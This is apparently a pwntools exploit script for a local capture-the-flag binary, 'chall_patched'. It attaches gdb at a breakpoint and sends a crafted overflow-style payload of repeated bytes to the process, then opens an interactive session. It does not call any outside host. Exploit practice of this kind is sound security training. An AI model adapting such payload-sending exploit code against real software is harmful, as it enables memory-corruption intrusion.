#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
p = process()
gdb.attach(p,gdbscript='''
           brva 0x00000000000013EF
           ''')
input()


payload = b'\xf1'
payload += b'\x18' * (0xa0 + 5 - 0xbc + 0x100)
p.send(payload)

p.interactive()
